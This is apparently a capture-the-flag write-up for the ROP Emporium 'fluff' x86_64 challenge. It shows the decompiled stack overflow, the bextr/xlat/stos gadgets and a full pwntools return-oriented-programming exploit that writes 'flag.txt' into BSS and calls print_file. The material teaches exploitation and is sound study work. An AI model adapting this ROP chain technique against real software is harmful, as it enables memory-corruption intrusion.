# fluff

## Reversing with Ghidva

### main
```c
int main() {
    pwnme();
    return 0;
}
```

### pwnme
```c
void pwnme() {
  char input[32];
  
  puts("fluff by ROP Emporium");
  puts("x86_64\n");
  memset(input, 0, 0x20);
  puts("You know changing these strings means I have to rewrite my solutions...");
  printf("> ");
  read(0, input, 0x200);
  puts("Thank you!");
  return;
}
```

### print_files
```c

void print_file(char *file_name) {
  char buf[40];
  FILE *file;
  
  file = 0;
  file = fopen(file_name, "r");
  if (file == 0) {
    printf("Failed to open file: %s\n",file_name);
    exit(1);
  }
  fgets(buf, 0x21, file);
  puts(buf);
  fclose(file);
  return;
}
```

## Reversing with ObjDump

### questionableGadgets label
```asm
0000000000400628 <questionableGadgets>:
  400628:       d7                      xlat   BYTE PTR ds:[rbx]
  400629:       c3                      ret    

  40062a:       5a                      pop    rdx
  40062b:       59                      pop    rcx
  40062c:       48 81 c1 f2 3e 00 00    add    rcx,0x3ef2
  400633:       c4 e2 e8 f7 d9          bextr  rbx,rcx,rdx
  400638:       c3                      ret    

  400639:       aa                      stos   BYTE PTR es:[rdi],al
  40063a:       c3                      ret    

  40063b:       0f 1f 44 00 00          nop    DWORD PTR [rax+rax*1+0x0]
```

## The vuln
A `Buffer Overflow` allows us to to create our usual ROPchain after `pwnme` function.

This challenge is a bit different from the last one, since we have no gadgets which directly write in a certain address, so we'll have to build our own `write primitive`.

## The exploit
Using `ObjDump` and `ropper` is possible to see some interesting gadgets (mainly in the [Questionable Gadgets label](#questionablegadgets-label)) like `bextr`, `xlat` and `stos`.

In order to write, we first have to choose where; the `BSS` is a perfect place since it's initialized with zeroes, so our string will be automatically terminated. The first gadget we want to call is the `bextr` one which pops `rdx` and `rcx`, adds `0x3ef2` to `rcx` and eventually runs `bextr`. Then `xlat` helps us setting up `al` which we'll need to correctly call `stos`.

### Instructions:
- `bextr` (Bit Field Extract):
  - 1st operand: `dst`
  - 2nd operand: `src`
  - 3rd operand: `start:end`, the first 8 bits are the `start offset` and the last 8 tell how much to copy.
  - Copies the bits from `src` to `dst` following the rules set by the third operand.

##

- `xlatb` (Table Look-up Translation):
  - Sets `al` to `rbx` + `al`

##

- `stosb` (Store String Byte):
  - 1st operand: `dst`
  - 2nd operand: `src`
  - Writes the character contained in `src` to the memory space pointed by `dst`

## The script
```py
from pwn import *
import os

#
# Context
#

e = context.binary = ELF('fluff')

#
# ROP
#

' Bextr writes to rbx, xlat uses rbx as index and write to al, stos writes al in the ES '

PRINT_FILE          = p64(e.plt['print_file'])

POP_RDI             = p64(next(e.search(asm('pop rdi; ret;'))))
ZERO_EAX_POP_RBP    = p64(next(e.search(asm('mov eax, 0; pop rbp; ret;'))))
XLATB               = p64(next(e.search(asm('xlatb; ret;'))))
BEXTR               = p64(next(e.search(asm('pop rdx; pop rcx; add rcx, 0x3ef2; bextr rbx, rcx, rdx; ret;'))))
STOS                = p64(next(e.search(asm('stosb byte ptr [rdi], al; ret;'))))

BSS_WRITE           = p64(e.bss(offset=0x200))

#
# Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x200))
io.wait()
core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))
io.close()
info(f'Offset: {offset}')

#
# Exploit
#

io = process(e.path)

target   = b'flag.txt'
payload  = b''
payload += b'A' * offset

payload += POP_RDI
payload += BSS_WRITE

payload += ZERO_EAX_POP_RBP
payload += b'JUNKJUNK'

oldchar = 0
for i in range(len(target)):
    payload += BEXTR
    payload += p64(0b1111111100000000)      # RDX
    target_byte = next(e.search(target[i]))
    payload += p64(target_byte - oldchar - 0x3ef2)  # RCX (-0x3ef2 + correct_number)
    oldchar = target[i]
    
    payload += XLATB
    
    payload += STOS

payload += POP_RDI
payload += BSS_WRITE
payload += PRINT_FILE

io.sendlineafter(b'> ', payload)

info(f'Flag: {io.recvrepeat(1).decode()}')

os.system('rm core*')
```